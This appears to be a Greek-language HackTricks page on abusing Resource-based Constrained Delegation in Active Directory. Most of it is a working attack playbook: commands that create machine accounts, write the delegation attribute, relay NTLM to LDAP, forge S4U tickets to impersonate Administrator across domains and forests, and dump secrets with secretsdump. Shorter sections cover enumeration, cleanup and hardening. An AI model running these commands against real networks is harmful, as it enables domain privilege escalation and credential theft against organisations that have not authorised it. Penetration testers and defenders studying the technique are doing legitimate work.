# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Βασικά στοιχεία του Resource-based Constrained Delegation

Το Resource-based constrained delegation (RBCD) είναι παρόμοιο με το [constrained delegation](constrained-delegation.md), αλλά η κατεύθυνση εμπιστοσύνης είναι αντίστροφη. Το παραδοσιακό constrained delegation καταγράφει σε ποιες υπηρεσίες μπορεί να κάνει delegation μια principal· το RBCD καταγράφει στο **target resource** ποιες principals μπορούν να υποδύονται χρήστες σε αυτό.<sup>[[12]](#references)</sup>

Το attribute _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ του target object περιέχει ένα security descriptor που προσδιορίζει τις principals που επιτρέπεται να ενεργούν εκ μέρους άλλων identities σε αυτόν τον resource.

Μια ακόμη σημαντική διαφορά είναι ότι μια principal με επαρκή **δικαιώματα εγγραφής σε έναν machine account** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` και παρόμοια δικαιώματα) μπορεί να μπορεί να ορίσει το _**msDS-AllowedToActOnBehalfOfOtherIdentity**_. Η ρύθμιση του παραδοσιακού constrained delegation συνήθως απαιτεί πιο προνομιακή διοικητική πρόσβαση.<sup>[[1]](#references)</sup>

Πιο συγκεκριμένα, η αλλαγή των ρυθμίσεων κλασικού constrained delegation συνήθως προϋποθέτει το `SeEnableDelegationPrivilege` σε domain controller, ένα δικαίωμα που κατέχουν κατά κανόνα διαχειριστές με υψηλά προνόμια. Το RBCD μεταφέρει την απόφαση στο security descriptor του target object, επομένως η πρόσβαση εγγραφής στη σχετική ιδιότητα του computer object μπορεί να αρκεί, χωρίς αυτό το δικαίωμα χρήστη.<sup>[[1]](#references)[[2]](#references)</sup>

### Νέες έννοιες

Το flag **`TrustedToAuthForDelegation`** στο `userAccountControl` συχνά περιγράφεται ως προϋπόθεση για το **S4U2Self**, αλλά αυτό δεν είναι πλήρες.\
Μια service principal με SPN μπορεί να ζητήσει S4U2Self χωρίς το flag. Με το `TrustedToAuthForDelegation`, το service ticket που επιστρέφεται είναι **forwardable**· χωρίς αυτό, το ticket είναι συνήθως **non-forwardable**.<sup>[[5]](#references)</sup>

Το παραδοσιακό constrained delegation απορρίπτει ένα **non-forwardable TGS** στο βήμα S4U2Proxy. Το RBCD μπορεί να δεχτεί εκείνο το S4U2Self ticket, όταν το security descriptor του target εξουσιοδοτεί την υπηρεσία που υποβάλλει το αίτημα.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Δομή της επίθεσης

> Αν έχετε **δικαιώματα ισοδύναμα με εγγραφή** σε έναν **computer account**, μπορεί να μπορέσετε να αποκτήσετε προνομιακή πρόσβαση σε αυτό το μηχάνημα.

Ας υποθέσουμε ότι ο attacker έχει ήδη **δικαιώματα ισοδύναμα με εγγραφή στο victim computer object**.

1. Ο attacker **παραβιάζει** έναν account με **SPN** ή **δημιουργεί έναν** («Service A»). Από προεπιλογή, ένας authenticated domain user μπορεί να δημιουργήσει έως και 10 computer objects, όπως ορίζεται από το **_MachineAccountQuota_**· ένα computer object παρέχει αυτόματα αξιοποιήσιμα SPN.
2. Ο attacker **καταχράται το δικαίωμα WRITE** που έχει στο victim computer (ServiceB), για να ρυθμίσει το **resource-based constrained delegation ώστε να επιτρέψει στο ServiceA να υποδύεται οποιονδήποτε χρήστη** σε αυτό το victim computer (ServiceB).
3. Ο attacker χρησιμοποιεί το Rubeus για να εκτελέσει μια **πλήρη επίθεση S4U** (S4U2Self και S4U2Proxy) από το Service A στο Service B, για έναν χρήστη **με προνομιακή πρόσβαση στο Service B**.
   1. S4U2Self (από τον παραβιασμένο ή δημιουργημένο SPN account): αίτημα για ένα **TGS που αντιπροσωπεύει τον Administrator προς το Service A** (non-forwardable).
   2. S4U2Proxy: χρήση αυτού του **non-forwardable TGS** για να ζητηθεί ένα service ticket που αντιπροσωπεύει τον **Administrator** προς το **victim host**.
   3. Το non-forwardable ticket μπορεί και πάλι να λειτουργήσει σε αυτή τη ροή RBCD, επειδή το Service A έχει εξουσιοδοτηθεί στο security descriptor του target resource.
4. Ο attacker μπορεί να κάνει **pass-the-ticket** και να **υποδυθεί** τον χρήστη, για να αποκτήσει **πρόσβαση στο victim ServiceB**.<sup>[[1]](#references)</sup>

Το `MachineAccountQuota=0` κλείνει την προεπιλεγμένη οδό δημιουργίας computer account, αλλά δεν αφαιρεί δικαιώματα εγγραφής στο target computer object ούτε τον έλεγχο ενός υπάρχοντος account. Ένας ελεγχόμενος συνηθισμένος χρήστης χωρίς SPN μπορεί μερικές φορές να χρησιμοποιηθεί ως principal που αναθέτει, μέσω της [μεθόδου U2U χωρίς SPN](#spn-less-cross-domain--cross-forest-rbcd), ακόμη και εντός ενός domain. Αυτή η οδός εξακολουθεί να απαιτεί αποτελεσματικό δικαίωμα εγγραφής RBCD, έλεγχο των credentials του χρήστη που αναθέτει, ταυτότητα προς impersonation που επιτρέπεται να γίνει delegation, συμβατή συμπεριφορά κρυπτογράφησης Kerberos και αλλαγή NT hash που διαταράσσει τη λειτουργία του account. Αντιμετωπίστε τα ως ξεχωριστές προϋποθέσεις· ένα κενό attribute RBCD ή μηδενικό quota από μόνο του δεν αποδεικνύει ούτε επιτυχία ούτε ασφάλεια.

Ένα υπάρχον RBCD descriptor μπορεί επίσης να αναφέρει μια **group** αντί για τον computer που αναθέτει απευθείας. Αν ελέγχετε έναν computer account που διαθέτει SPN και μπορείτε να τον προσθέσετε σε αυτήν την group, η νέα συμμετοχή μπορεί να παρέχει την οδό delegation χωρίς αλλαγή του attribute RBCD του target computer. Ελέγξτε το ACL εγγραφής συμμετοχής της group όπως ισχύει στην πράξη (συμπεριλαμβανομένων των deny ACEs), τις nested συμμετοχές και την ανανέωση του token, το trustee SID του descriptor, τους περιορισμούς delegation του account που γίνεται impersonate και το target service SPN, πριν καταλήξετε ότι η οδός λειτουργεί.

Για να ελέγξετε το _**MachineAccountQuota**_ του domain, μπορείτε να χρησιμοποιήσετε:

```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## Επίθεση

### Δημιουργία αντικειμένου υπολογιστή

Μπορείτε να δημιουργήσετε ένα αντικείμενο υπολογιστή εντός του domain χρησιμοποιώντας το **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>

```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### Ρύθμιση του Resource-based Constrained Delegation

**Με χρήση του Active Directory PowerShell module**<sup>[[4]](#references)</sup>

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**Χρήση του powerview**<sup>[[3]](#references)</sup>

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### Εκτέλεση μιας πλήρους επίθεσης S4U (Windows/Rubeus)

Πρώτα, δημιουργήσαμε το νέο αντικείμενο Computer με τον κωδικό πρόσβασης `123456`, επομένως χρειαζόμαστε το hash αυτού του κωδικού πρόσβασης:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

Αυτό θα εμφανίσει τα hashes RC4 και AES για αυτόν τον λογαριασμό.\
Τώρα, μπορεί να εκτελεστεί η επίθεση:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

Μπορείτε να δημιουργήσετε περισσότερα tickets για περισσότερες υπηρεσίες, απλώς ζητώντας μία φορά με την παράμετρο `/altservice` του Rubeus:

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

> [!CAUTION]
> Οι χρήστες μπορούν να επισημανθούν ως **"Account is sensitive and cannot be delegated."** Αν αυτή η σημαία είναι ενεργοποιημένη, ο λογαριασμός δεν μπορεί να υποδυθεί άλλο άτομο μέσω αυτής της ροής delegation. Το BloodHound εμφανίζει αυτή την ιδιότητα κατά την ανάλυση.

### Εργαλεία Linux: RBCD από άκρο σε άκρο με το Impacket (2024+)

Αν εργάζεστε από Linux, μπορείτε να εκτελέσετε ολόκληρη την αλυσίδα RBCD χρησιμοποιώντας τα επίσημα εργαλεία του Impacket:<sup>[[6]](#references)[[7]](#references)</sup>

```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```

Σημειώσεις
- Αν απαιτείται LDAP signing/LDAPS, χρησιμοποιήστε `impacket-rbcd -use-ldaps ...`.
- Προτιμήστε κλειδιά AES· πολλά σύγχρονα domains περιορίζουν το RC4. Τόσο το Impacket όσο και το Rubeus υποστηρίζουν ροές μόνο με AES.
- Το Impacket μπορεί να ξαναγράψει το `sname` («AnySPN») για ορισμένα εργαλεία, αλλά χρησιμοποιείτε το σωστό SPN όποτε είναι δυνατό (π.χ. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## RBCD μεταξύ domains και forests

Αν η **delegating principal** που ελέγχετε βρίσκεται σε **διαφορετικό domain** (ή ακόμη και σε **διαφορετικό forest**) από τον **υπολογιστή-πόρο**, η κατάχρηση εξακολουθεί να είναι **RBCD**, αλλά η ροή ticket δεν ακολουθεί πλέον τη συνήθη διαδικασία ενός domain `S4U2Self -> S4U2Proxy`.

### RBCD μεταξύ domains: διαμόρφωση του foreign principal μέσω SID

Όταν ορίζετε το `msDS-AllowedToActOnBehalfOfOtherIdentity` από **διαφορετικό domain**, το foreign machine/user ενδέχεται **να μην μπορεί να επιλυθεί βάσει ονόματος** στο LDAP του domain-στόχου. Σε αυτή την περίπτωση, διαμορφώστε την καταχώριση delegation χρησιμοποιώντας το **SID** του foreign principal αντί για το sAMAccountName/UPN του.

Αυτό είναι ιδιαίτερα σημαντικό όταν γίνεται relay NTLM προς LDAP με το `ntlmrelayx.py`:<sup>[[9]](#references)</sup>

```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
  --no-dump --no-da --no-validate-privs \
  --delegate-access \
  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
  --sid
```

Σημειώσεις:
- Το `--sid` λέει στο `ntlmrelayx.py` να αντιμετωπίζει το `--escalate-user` ως SID, κάτι που απαιτείται όταν ο λογαριασμός που εκχωρεί δικαιώματα ανήκει σε διαφορετικό domain από το domain-στόχο.
- Ακόμα κι αν το εργαλείο εμφανίσει `User not found in LDAP`, η εγγραφή της εκχώρησης μπορεί και πάλι να πετύχει, επειδή το security descriptor αποθηκεύει απευθείας το ξένο SID.

### RBCD μεταξύ domains: ακολουθία cross-realm S4U

Μόλις η ξένη principal προστεθεί στο `msDS-AllowedToActOnBehalfOfOtherIdentity`, η λειτουργική ροή μεταξύ domains είναι η εξής:<sup>[[9]](#references)[[13]](#references)</sup>

1. Λάβετε ένα **TGT** για την principal που εκχωρεί δικαιώματα από το domain της.
2. Ζητήστε ένα **referral TGT** για το `krbtgt/<target-domain>`.
3. Ζητήστε ένα **cross-realm S4U2Self referral** για τον χρήστη που θα γίνει impersonate, στον DC του domain-στόχου.
4. Ζητήστε το πραγματικό ticket **S4U2Self** για αυτόν τον χρήστη, πίσω στο domain της principal που εκχωρεί δικαιώματα.
5. Εκτελέστε **S4U2Proxy** στο domain της principal που εκχωρεί δικαιώματα, για να λάβετε ένα referral ticket για το domain-στόχο.
6. Εκτελέστε το τελικό **S4U2Proxy** στον DC του domain-στόχου, για να λάβετε το service ticket για `cifs/host.target`, `host/host.target` κ.λπ.

Αυτός είναι ο λόγος που τα τυπικά εργαλεία Linux συχνά αποτυγχάνουν στο RBCD μεταξύ domains:<sup>[[9]](#references)</sup>
- Το **realm** του αιτήματος μπορεί να χρειάζεται να διαφέρει από το realm του TGT που χρησιμοποιείται στο `TGS-REQ`.
- Η αλυσίδα χρειάζεται **ανεξάρτητα βήματα S4U2Proxy**, όχι μόνο `S4U2Self` ή `S4U2Self` ακολουθούμενο αμέσως από ένα μόνο `S4U2Proxy`.

### RBCD μεταξύ domains από Linux

Η Synacktiv δημοσίευσε μια υλοποίηση του Impacket `getST.py` που αναπαράγει την ακολουθία cross-realm από Linux, χειριζόμενη ρητά τους δύο KDC:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
  -dc-ip 192.168.90.131 \
  -targetdc 192.168.90.217 \
  -targetdomain asgard.local \
  -impersonate thor_adm \
  -spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
  ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
  -k -no-pass -dc-ip 192.168.90.217
```

Λειτουργικά, τα νέα arguments είναι:
- `-dc-ip`: DC του **delegating** domain
- `-targetdomain`: domain του **resource computer**
- `-targetdc`: DC του **resource** domain

### Περιορισμοί του Cross-forest RBCD

Το Cross-forest RBCD έχει έναν σημαντικό περιορισμό: **ο χρήστης που γίνεται impersonate πρέπει να ανήκει στο ίδιο forest με το delegating principal**. Με άλλα λόγια, αν ο ελεγχόμενος λογαριασμός μηχανήματός σας βρίσκεται στο `valhalla.local` και το target resource στο `asgard.local`, γενικά **δεν μπορείτε** να κάνετε impersonate αυθαίρετους χρήστες του `asgard.local` σε αυτό το resource μέσω RBCD.<sup>[[9]](#references)</sup>

Παρόλα αυτά, εξακολουθεί να είναι exploitable όταν:
- ο χρήστης του **delegating forest** είναι **local admin** (ή έχει άλλα προνόμια) στο resource host του άλλου forest
- ένα trust επιτρέπει την απαιτούμενη διαδρομή authentication και το foreign SID γίνεται αποδεκτό στο security descriptor του target computer

### Ιδιαιτερότητες του Cross-forest RBCD protocol

Το Cross-forest RBCD δεν είναι απλώς «cross-domain συν ένα trust». Η παρατηρούμενη ροή περιλαμβάνει δύο ιδιαιτερότητες που συχνά παραβλέπονται από τα συνηθισμένα εργαλεία:<sup>[[9]](#references)</sup>

1. Ένα επιπλέον αίτημα **S4U2Proxy** που ορίζει **`PA-PAC-OPTIONS=branch-aware`**
2. Ένα τελικό service ticket που μπορεί να επιστραφεί με χρήση **RC4**, ακόμη και όταν έχουν ζητηθεί άλλα etypes

Η πρακτική ροή είναι:

1. Λάβετε ένα TGT για το delegating principal στο forest A.
2. Ζητήστε **S4U2Self** για τον χρήστη που γίνεται impersonate στο forest A.
3. Ζητήστε **S4U2Proxy** στο forest A, για να λάβετε ένα referral TGT για το forest B.
4. Στείλτε ένα δεύτερο **S4U2Proxy** στο forest A **χωρίς** το S4U2Self ticket ως additional ticket, αλλά με ενεργοποιημένο το `branch-aware`, για να λάβετε ένα ακόμη referral TGT για το forest B.
5. Προαιρετικά, ζητήστε ένα κανονικό service ticket στο forest B για το delegating principal (αυτό το ticket δεν απαιτείται για την τελική κατάχρηση).
6. Χρησιμοποιήστε τα referral tickets από τα βήματα 3 και 4 για να ζητήσετε το τελικό ticket **S4U2Proxy** στο forest B, ώστε ο χρήστης του forest A που γίνεται impersonate να αποκτήσει πρόσβαση στο target SPN.

### Cross-forest RBCD από Linux

Το ίδιο Synacktiv Impacket branch προσθέτει ένα switch `-forest` για αυτή τη λογική:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
  -impersonate 'v_thor' \
  -dc-ip VALHALLA.local \
  valhalla.local/'desktop$' \
  -targetdc ASGARD.local \
  -targetdomain asgard.local \
  -aesKey 4[...]f \
  -forest
```

### Αναδρομικό RBCD πολλαπλών domains (3+ domains)

Σε **forests πολλαπλών domains**, τόσο το **S4U2Self** όσο και το **S4U2Proxy** μπορούν να είναι **αναδρομικά**, αντί να σταματούν μετά από μία παραπομπή:

- **Αναδρομικό S4U2Self**: το πρώτο `S4U2Self` αποστέλλεται στο **domain του χρήστη που γίνεται impersonate**, διασχίζονται ενδιάμεσα άλματα γονικού/θυγατρικού domain μέσω κανονικών παραπομπών `TGS-REQ` για `krbtgt/<REALM>` και το **τελικό `S4U2Self`** αποστέλλεται στο **domain της delegating principal**.
- Αυτό σημαίνει ότι **αρκεί να έχεις ένα TGT** για έναν λογαριασμό μηχανήματος, ώστε να κάνεις impersonate έναν **admin από άλλο domain στο ίδιο forest** και να ζητήσεις `cifs/host`, `host/host`, `wsman/host` κ.λπ.
- Το **αναδρομικό S4U2Proxy** ακολουθεί την ίδια αλυσίδα trust: στα ενδιάμεσα άλματα χρησιμοποιείται ξανά το προηγούμενο ticket ως TGT, ενώ ζητείται η επόμενη παραπομπή `krbtgt/<REALM>`. Μόνο το τελευταίο άλμα επιστρέφει το τελικό service ticket.<sup>[[10]](#references)</sup>

Ένα πρακτικό παράδειγμα στο ίδιο forest είναι:

```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
  -impersonate Administrator@frperso.local -self \
  -altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```

### RBCD χωρίς SPN μεταξύ domains / forests

Αν ο **delegating principal είναι χρήστης χωρίς SPN**, το τελευταίο αναδρομικό `S4U2Self` αποτυγχάνει με **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Η λύση είναι να **επαναλάβετε μόνο το τελευταίο hop ως `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Σύντομη εκδοχή της αλυσίδας κατάχρησης:

1. Κάντε authenticate με το **NT hash**, ώστε ο KDC να κατευθυνθεί προς **RC4-HMAC (etype 23)**.
2. Ζητήστε πρώτα **`-self -u2u`** και κρατήστε αυτό το ticket ξεχωριστά από το μεταγενέστερο βήμα proxy.
3. Εξαγάγετε το **TGT session key** με το `describeTicket.py`.
4. Αντικαταστήστε το **NT hash** του χρήστη με αυτό το **session key** χρησιμοποιώντας το `changepasswd.py -newhashes <session_key>`.
5. Χρησιμοποιήστε ξανά το ticket `S4U2Self+U2U` ως **`-additional-ticket`** σε ξεχωριστό αίτημα **`-proxy`**.

```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
  -impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
  -hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```

Επιχειρησιακές επισημάνσεις:

- Όταν το **πρώτο έμπιστο hop είναι ήδη ένα άλλο forest**, προτιμήστε τον **branch-aware** αλγόριθμο (`getST.py ... -forest`), ώστε να ταιριάζει με την εγγενή συμπεριφορά των Windows. Αν το ξένο forest βρίσκεται μόνο πιο μετά στην αλυσίδα, η αναδρομική ροή που δεν λαμβάνει υπόψη τα branches μπορεί και πάλι να λειτουργήσει.<sup>[[9]](#references)</sup>
- Σε πρόσφατους DC με **Windows Server 2022/2025**, η αναγκαστική χρήση RC4 μπορεί να αποτύχει με **`KDC_ERR_ETYPE_NOSUPP`** λόγω της απόσυρσης του RC4· αυτό μπορεί να καταστήσει αδύνατο το **SPN-less RBCD**, παρότι το κλασικό RBCD με SPN εξακολουθεί να λειτουργεί με AES.<sup>[[15]](#references)</sup>
- Εκτελέστε το **`S4U2Self+U2U` πριν αλλάξετε το hash/τον κωδικό πρόσβασης του χρήστη**: η **`SamrChangePasswordUser`** δεν επανυπολογίζει τα κλειδιά Kerberos AES του λογαριασμού, οπότε η αλλαγή του κωδικού πρώτα μπορεί να προκαλέσει αποτυχία σε επόμενα αιτήματα εισιτηρίων.<sup>[[14]](#references)</sup>
- Ο λογαριασμός που γίνεται impersonation πρέπει να εξακολουθεί να είναι **κατάλληλος για delegation**: οι **Protected Users** και οι λογαριασμοί με **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** εμποδίζουν την αλυσίδα.

## Σημειώσεις εντοπισμού / σκλήρυνσης

- Οι διαδρομές RBCD μεταξύ domains/forests εξακολουθούν συνήθως να δημιουργούνται μέσω **κατάχρησης ACL** ή **relay-to-LDAP**. Επιβάλετε **LDAP signing** και **LDAP channel binding** στους DC, για να αποκλείσετε συνηθισμένους τρόπους δημιουργίας τους.
- Ελέγξτε ποιοι μπορούν να γράψουν το `msDS-AllowedToActOnBehalfOfOtherIdentity` σε αντικείμενα υπολογιστών και επιλύστε τα αποθηκευμένα SID, συμπεριλαμβανομένων των **foreign security principals**.
- Σε περιβάλλοντα με πολλά trusts, ελέγξτε το **Selective Authentication**, το **SID filtering** και αν χρήστες από ξένο forest έχουν δικαιώματα **local admin** στους hosts πόρων.

### Πρόσβαση

Η τελευταία γραμμή εντολών εκτελεί την **πλήρη επίθεση S4U και εισάγει το TGS** από τον Administrator στον host-θύμα, στη **μνήμη**.\
Σε αυτό το παράδειγμα, ζητήθηκε ένα TGS για την υπηρεσία **CIFS** από τον Administrator, επομένως θα μπορείτε να αποκτήσετε πρόσβαση στο **C$**:

```bash
ls \\victim.domain.local\C$
```

### Κατάχρηση διαφορετικών service tickets

Μάθετε για τα [**διαθέσιμα service tickets εδώ**](silver-ticket.md#available-services).

## Απαρίθμηση, έλεγχος και εκκαθάριση

### Απαρίθμηση υπολογιστών με ρυθμισμένο RBCD

PowerShell (αποκωδικοποίηση του SD για την επίλυση των SID):

```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

Impacket (ανάγνωση ή εκκαθάριση με μία εντολή):

```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

### Εκκαθάριση / επαναφορά RBCD

- PowerShell (εκκαθάριση του attribute):

```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

- Impacket:

```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Σφάλματα Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Αυτό σημαίνει ότι το kerberos έχει ρυθμιστεί να μη χρησιμοποιεί DES ή RC4 και παρέχετε μόνο το RC4 hash. Παρέχετε στο Rubeus τουλάχιστον το AES256 hash (ή απλώς παρέχετε τα hashes rc4, aes128 και aes256). Παράδειγμα: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** κατά τη χρήση του `-self` για έναν κανονικό χρήστη: η principal που πραγματοποιεί delegation πιθανότατα **δεν έχει SPN**. Δοκιμάστε ξανά το **τελευταίο hop** ως **`S4U2Self+U2U`** αντί για κανονικό `S4U2Self`.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** κατά τη χρήση **SPN-less RBCD**: πρόσφατοι DCs μπορεί να απορρίψουν τη διαδρομή **RC4-HMAC** που απαιτείται από το τέχνασμα `S4U2Self+U2U` + session-key-substitution. Δοκιμάστε μια κλασική διαδρομή **SPN-backed** RBCD με AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Αυτό σημαίνει ότι η ώρα του τρέχοντος υπολογιστή διαφέρει από εκείνη του DC και το kerberos δεν λειτουργεί σωστά.
- **`preauth_failed`**: Αυτό σημαίνει ότι το δοσμένο username + hashes δεν λειτουργούν για login. Ίσως ξεχάσατε να βάλετε το "$" μέσα στο username κατά τη δημιουργία των hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Αυτό μπορεί να σημαίνει:
  - Ο χρήστης που προσπαθείτε να κάνετε impersonate δεν μπορεί να έχει πρόσβαση στην επιθυμητή υπηρεσία (επειδή δεν μπορείτε να τον κάνετε impersonate ή επειδή δεν έχει αρκετά privileges)
  - Η υπηρεσία που ζητήσατε δεν υπάρχει (αν ζητάτε ticket για winrm ενώ το winrm δεν εκτελείται)
  - Το fakecomputer που δημιουργήθηκε έχει χάσει τα privileges του στον ευάλωτο server και πρέπει να του τα αποδώσετε ξανά.
  - Κάνετε κατάχρηση του classic KCD· θυμηθείτε ότι το RBCD λειτουργεί με non-forwardable S4U2Self tickets, ενώ το KCD απαιτεί forwardable.

## Σημειώσεις, relays και εναλλακτικές

- Μπορείτε επίσης να γράψετε το RBCD SD μέσω AD Web Services (ADWS), αν το LDAP φιλτράρεται. Δείτε:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Οι αλυσίδες Kerberos relay καταλήγουν συχνά σε RBCD για να αποκτήσουν local SYSTEM με ένα βήμα. Δείτε πρακτικά παραδείγματα από άκρο σε άκρο:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Αν το LDAP signing/channel binding είναι **απενεργοποιημένο** και μπορείτε να δημιουργήσετε machine account, εργαλεία όπως το **KrbRelayUp** μπορούν να κάνουν relay ένα εξαναγκασμένο Kerberos auth προς το LDAP, να ορίσουν το `msDS-AllowedToActOnBehalfOfOtherIdentity` για το machine account σας στο computer object του target και να κάνουν αμέσως impersonate τον **Administrator** μέσω S4U από off-host.<sup>[[8]](#references)</sup>

## References

- [1] [Κουνώντας τον σκύλο: Κατάχρηση του Resource-Based Constrained Delegation για επίθεση στο Active Directory](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Μια ακόμη λέξη για το Delegation – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Ανάληψη ελέγχου Computer Object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Κατάχρηση του Resource-Based Constrained Delegation](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Το Kerberosity σκότωσε το Domain: Μια επισκόπηση του offensive Kerberos](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (επίσημο)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Σύντομο Linux cheatsheet με πρόσφατη σύνταξη](https://tldrbins.github.io/rbcd/)
